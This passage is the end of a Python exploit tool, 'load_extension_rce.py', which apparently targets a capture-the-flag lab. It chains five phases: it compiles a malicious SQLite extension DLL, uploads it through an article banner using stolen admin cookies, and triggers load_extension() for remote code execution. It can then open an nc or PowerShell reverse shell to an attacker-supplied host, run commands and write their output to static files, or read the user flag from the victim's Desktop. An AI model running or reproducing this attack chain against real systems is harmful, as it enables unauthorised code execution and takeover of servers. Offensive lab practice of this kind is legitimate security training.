            (3, "UPLOAD", self.phase_upload),
            (4, "TRIGGER", self.phase_trigger),
            (5, "VERIFY", self.phase_verify)
        ]

        for num, name, func in phases:
            if self.interactive:
                print()
                if not confirm(f"Run Phase {num}: {name}?"):
                    warn("Aborted by user")
                    return False

            if not func():
                error(f"Phase {num} ({name}) failed")
                return False

            success(f"Phase {num} ({name}) complete")

        return True

    def run_quick_dll(self):
        """
        Quick DLL upload and trigger - convenience function.

        Skips prereq check, compiles if needed, uploads, and triggers.
        Useful for rapid iteration when testing different commands.
        """
        section("QUICK DLL", "Fast compile -> upload -> trigger")

        # Force recompile for quick mode
        self.force = True

        # Compile
        if not self.phase_compile():
            error("Compile failed")
            return False

        # Upload
        if not self.phase_upload():
            error("Upload failed")
            return False

        # Trigger
        if not self.phase_trigger():
            error("Trigger failed")
            return False

        # Verify
        return self.phase_verify()


# =============================================================================
# MAIN
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='SQLite load_extension RCE Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{C.C}EXAMPLES{C.X}
  python3 load_extension_rce.py --lhost 10.10.15.49
  python3 load_extension_rce.py --lhost 10.10.15.49 --confirm
  python3 load_extension_rce.py --lhost 10.10.15.49 --test-only
  python3 load_extension_rce.py --run-phase 1

{C.C}PHASES{C.X}
  1: PREREQ   - Verify cookies, compiler, connectivity
  2: COMPILE  - Build SQLite extension DLL
  3: UPLOAD   - Upload DLL via article banner
  4: TRIGGER  - Execute load_extension()
  5: VERIFY   - Confirm code execution

{C.C}PREREQUISITES{C.X}
  - Run lab_exploit.py first to get admin cookies
  - Install mingw-w64: sudo apt install mingw-w64
  - For shell: HTTP server + netcat listener
        """
    )

    # Mode selection
    parser.add_argument('--run-phase', type=int, metavar='N', choices=range(1, 6),
                        help='Run only phase N (1-5)')
    parser.add_argument('--phases', action='store_true',
                        help='Show detailed phase information')

    # Required for compile
    parser.add_argument('--lhost', metavar='IP',
                        help='Attacker IP address (required for compile)')

    # Optional configuration
    parser.add_argument('--lport', type=int, default=DEFAULT_SHELL_PORT,
                        metavar='PORT', help=f'Reverse shell port (default: {DEFAULT_SHELL_PORT})')
    parser.add_argument('--callback-port', type=int, default=DEFAULT_CALLBACK_PORT,
                        metavar='PORT', help=f'HTTP callback port (default: {DEFAULT_CALLBACK_PORT})')

    # Mode flags
    parser.add_argument('--test-only', action='store_true',
                        help='Test RCE only (create marker files, no shell)')
    parser.add_argument('--shell-type', choices=['nc', 'powershell'], default='nc',
                        help='Shell type: nc (default) or powershell')
    parser.add_argument('--confirm', action='store_true',
                        help='Ask for confirmation before each phase')
    parser.add_argument('--force', action='store_true',
                        help='Force recompile/reupload even if already done')

    # File-based command execution (for when reverse shells are blocked)
    parser.add_argument('--file-cmd', metavar='CMD',
                        help='File-based RCE: run CMD, output to static/, read via HTTP')
    parser.add_argument('--quick-dll', action='store_true',
                        help='Quick DLL: compile->upload->trigger in one step (skips prereq)')

    # Convenience flags for common operations
    parser.add_argument('--get-user-flag', action='store_true',
                        help='Retrieve user flag (runs whoami, reads Desktop\\user.txt)')

    args = parser.parse_args()

    # Handle --get-user-flag: sets file_cmd to the flag retrieval command
    if args.get_user_flag:
        args.file_cmd = 'for /f "tokens=2 delims=\\\\" %u in (\'whoami\') do type C:\\Users\\%u\\Desktop\\user.txt'
        args.force = True  # Always recompile for flag retrieval

    # Show phase help
    if args.phases:
        print_phase_help()
        return 0

    banner()

    # Create exploit instance
    exploit = LoadExtensionExploit(
        lhost=args.lhost,
        lport=args.lport,
        callback_port=args.callback_port,
        shell_type=args.shell_type,
        test_only=args.test_only,
        force=args.force,
        interactive=args.confirm,
        file_cmd=args.file_cmd,
        quick_dll=args.quick_dll
    )

    # Show configuration
    if args.file_cmd:
        info(f"Mode: File-based command execution")
        info(f"Command: {args.file_cmd}")
    elif args.test_only:
        info(f"Mode: Test RCE")
    else:
        info(f"Mode: {args.shell_type.upper()} Shell")

    if args.lhost:
        info(f"LHOST: {args.lhost}")
        info(f"LPORT: {args.lport}")
        info(f"Callback: {args.callback_port}")

    # Run single phase or all
    if args.run_phase:
        success_flag = exploit.run_phase(args.run_phase)
    elif args.quick_dll:
        # Quick DLL mode - requires file_cmd or lhost
        if not args.file_cmd and not args.lhost:
            error("--quick-dll requires either --file-cmd or --lhost")
            info("Usage: python3 load_extension_rce.py --quick-dll --file-cmd 'whoami'")
            return 1
        success_flag = exploit.run_quick_dll()
    elif args.file_cmd:
        # File-based command execution - full chain
        success_flag = exploit.run_all()
    else:
        # Standard shell mode - requires lhost
        if not args.lhost:
            error("--lhost is required (or use --file-cmd for file-based RCE)")
            info("Usage: python3 load_extension_rce.py --lhost YOUR_IP")
            info("   or: python3 load_extension_rce.py --file-cmd 'whoami /all'")
            return 1

        success_flag = exploit.run_all()

    # Summary
    if success_flag:
        section("COMPLETE")
        print(f"{C.G}Exploit chain completed successfully!{C.X}")

        if args.file_cmd:
            print()
            print(f"{C.C}File-based command execution complete.{C.X}")
            print(f"Run another command with: python3 load_extension_rce.py --file-cmd 'COMMAND' --force")
        elif not args.test_only:
            print()
            print(f"{C.Y}NOTE: Reverse shells may be blocked on this target!{C.X}")
            print(f"  If you didn't get a shell, try file-based execution:")
            print(f"  python3 load_extension_rce.py --file-cmd 'whoami /all'")
            print()
            print(f"{C.Y}If using shell mode, ensure:{C.X}")
            print(f"  1. HTTP server running: python3 -m http.server {args.callback_port}")
            print(f"  2. nc64.exe in server directory")
            print(f"  3. Listener running: nc -nlvp {args.lport}")
            print()
            print(f"Then re-run phase 4: python3 load_extension_rce.py --run-phase 4")
    else:
        print(f"\n{C.R}Exploit failed{C.X}")
        return 1

    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted{C.X}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{C.R}[!] Error: {e}{C.X}")
        raise
